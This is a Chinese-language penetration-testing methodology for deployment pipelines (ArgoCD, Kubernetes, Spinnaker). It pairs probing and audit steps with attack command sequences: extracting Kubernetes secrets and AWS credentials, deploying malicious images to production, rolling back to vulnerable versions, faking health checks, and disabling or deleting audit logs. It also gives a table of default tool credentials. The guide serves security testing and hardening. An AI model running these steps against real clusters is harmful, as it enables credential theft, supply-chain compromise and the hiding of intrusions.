# 部署管道安全测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供部署管道安全测试的系统化方法
- 指导测试人员识别自动化部署流程中的安全风险
- 帮助理解持续部署环节的攻击面和防御措施

## 1.2 适用范围
- 适用于自动化部署到云环境的场景
- 适用于 Kubernetes、Serverless、虚拟机等部署目标
- 适用于使用 ArgoCD、Spinnaker、Tekton 等部署工具的环境

## 1.3 读者对象
- 渗透测试工程师
- DevSecOps 工程师
- 云平台安全人员
- 部署管道管理员

---

# 第二部分：核心渗透技术专题

## 专题一：部署管道安全测试

### 2.1 技术介绍

部署管道安全测试是指对自动化部署流程进行系统性安全评估，识别部署配置、权限管理、环境隔离、回滚机制等方面存在的安全弱点，防止攻击者通过篡改部署流程实现恶意代码上线或环境入侵。

**部署管道架构：**

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  代码仓库    │ -> │  CI/CD 系统  │ -> │  制品仓库    │
└─────────────┘    └─────────────┘    └─────────────┘
                                              │
                                              ▼
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  生产环境    │ <- │  部署工具    │ <- │  配置管理    │
└─────────────┘    └─────────────┘    └─────────────┘
```

**常见攻击面：**

| 攻击面 | 描述 | 危害等级 |
|-------|------|---------|
| 部署凭证 | 部署使用的云凭证、K8s 凭证 | 严重 |
| 环境配置 | 生产/测试环境隔离配置 | 高 |
| 回滚机制 | 版本回滚流程 | 高 |
| 审批流程 | 部署审批配置 | 中 |
| 健康检查 | 部署后验证机制 | 中 |
| 通知集成 | Slack/邮件通知配置 | 低 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 自动部署到生产 | 代码合并后自动部署 | 缺乏审批和验证 |
| 多环境部署 | dev/staging/prod 同时部署 | 环境隔离不当 |
| 蓝绿部署 | 流量切换配置 | 切换逻辑可能被利用 |
| 金丝雀发布 | 渐进式发布配置 | 灰度规则可能被绕过 |
| 回滚操作 | 一键回滚功能 | 回滚可能部署旧漏洞版本 |
| 紧急部署 | 热修复流程 | 可能绕过正常审批 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别部署系统**
```bash
# 检查常见部署工具
# ArgoCD
curl https://argocd.target.com

# Spinnaker
curl https://spinnaker.target.com

# Jenkins X
curl https://jenkinsx.target.com

# Kubernetes API
curl -k https://k8s-api.target.com
```

**步骤二：检查部署配置**
```bash
# 检查 Kubernetes 部署文件
curl https://target.com/k8s/deployment.yaml
curl https://target.com/k8s/manifests/

# 检查 Helm Charts
curl https://target.com/charts/

# 检查 Terraform 配置
curl https://target.com/terraform/
```

**步骤三：探测部署端点**
```bash
# 扫描部署相关端口
nmap -p 8080,8443,9090,6443 target.com

# 检查 API 端点
curl https://target.com/api/deploy
curl https://target.com/api/releases
```

#### 2.3.2 白盒测试

**步骤一：审计部署配置**
```yaml
# 检查 deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: app
spec:
  template:
    spec:
      containers:
      - name: app
        image: app:latest  # 风险：使用 latest 标签
        env:
        - name: DB_PASSWORD  # 风险：环境变量存储敏感信息
          value: "hardcoded"
```

**步骤二：检查 RBAC 配置**
```yaml
# 检查 Kubernetes RBAC
kubectl get clusterroles
kubectl get rolebindings

# 检查过度权限
# cluster-admin 权限分配
```

**步骤三：审计部署脚本**
```bash
# 检查部署脚本
cat deploy.sh
cat deploy-to-prod.sh

# 检查凭证使用
grep -r "password\|token\|key" scripts/
```

### 2.4 漏洞利用方法

#### 2.4.1 部署凭证窃取

```bash
# 1. 识别存储的凭证
# Kubernetes Secrets
kubectl get secrets

# AWS 凭证
cat ~/.aws/credentials

# 2. 提取凭证
kubectl get secret deploy-token -o jsonpath='{.data.token}' | base64 -d

# 3. 使用凭证进行部署
kubectl apply -f malicious-deployment.yaml
```

#### 2.4.2 恶意镜像部署

```bash
# 1. 推送恶意镜像到仓库
docker push registry.target.com/app:malicious

# 2. 修改部署配置
sed -i 's/app:latest/app:malicious/' deployment.yaml

# 3. 触发部署
kubectl apply -f deployment.yaml
```

#### 2.4.3 环境隔离绕过

```bash
# 1. 识别环境配置
kubectl config get-contexts

# 2. 如果环境隔离不当
# 可以从测试环境部署到生产

# 3. 修改部署目标
kubectl config use-context production

# 4. 执行部署
kubectl apply -f malicious-app.yaml
```

#### 2.4.4 回滚攻击

```bash
# 1. 识别可回滚版本
kubectl rollout history deployment/app

# 2. 回滚到存在漏洞的旧版本
kubectl rollout undo deployment/app --to-revision=1

# 3. 旧版本可能存在已知漏洞
# 如 Log4j、Fastjson 等
```

#### 2.4.5 配置漂移攻击

```bash
# 1. 直接修改生产环境配置
kubectl patch deployment app -p '{"spec":{"template":{"spec":{"containers":[{"name":"app","image":"malicious:latest"}]}}}}'

# 2. 如果无 GitOps 验证
# 配置漂移可能不被发现

# 3. 持续化访问
# 定期修改配置保持访问
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过部署审批

```bash
# 1. 利用自动部署规则
# 如果配置了特定分支自动部署

# 2. 利用紧急部署流程
# 热修复可能无需审批

# 3. 利用管理员权限
# 如果获取了 admin 权限
```

#### 2.5.2 绕过健康检查

```bash
# 1. 实现虚假健康端点
@app.route('/health')
def health():
    return 'OK'  # 始终返回健康

# 2. 延迟恶意行为
# 部署后等待一段时间再执行

# 3. 条件触发
# 检测到特定请求才执行恶意代码
```

#### 2.5.3 绕过审计日志

```bash
# 1. 禁用审计
# 如果有权修改配置
kubectl patch configmap audit-config ...

# 2. 日志删除
# 删除或修改审计日志

# 3. 使用无日志操作
# 利用不产生日志的 API
```

---

# 第三部分：附录

## 3.1 部署安全检查表

| 检查项 | 是/否 | 风险等级 |
|-------|------|---------|
| 部署需要审批 | | 高 |
| 环境严格隔离 | | 高 |
| 使用具体镜像标签 | | 高 |
| 凭证安全存储 | | 严重 |
| RBAC 最小权限 | | 高 |
| 启用审计日志 | | 中 |
| 配置 GitOps 验证 | | 中 |
| 有回滚验证机制 | | 中 |

## 3.2 Kubernetes 安全配置示例

```yaml
# 安全的 Deployment 配置
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  template:
    spec:
      containers:
      - name: app
        image: app@sha256:abc123...  # 使用 digest
        securityContext:
          runAsNonRoot: true
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
        env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-secret
              key: password
```

## 3.3 常见部署工具默认凭证

| 工具 | 默认 URL | 默认凭证 |
|-----|---------|---------|
| ArgoCD | https://host:443 | admin/password |
| Spinnaker | http://host:9000 | 无默认，需配置 |
| Jenkins | http://host:8080 | 初始密码在文件 |
| Harbor | https://host | admin/Harbor12345 |
| Rancher | https://host | admin/admin |

## 3.4 部署安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| OPA Gatekeeper | 策略执行 | https://open-policy-agent.github.io/gatekeeper |
| Kyverno | K8s 策略引擎 | https://kyverno.io/ |
| ArgoCD | GitOps 部署 | https://argoproj.github.io/cd/ |
| Falco | 运行时安全 | https://falco.org/ |

---

## 参考资源

- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [ArgoCD Security](https://argo-cd.readthedocs.io/en/stable/operator-manual/security/)
- [OWASP Kubernetes Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
- [CNCF Security Technical Advisory Group](https://github.com/cncf/tag-security)
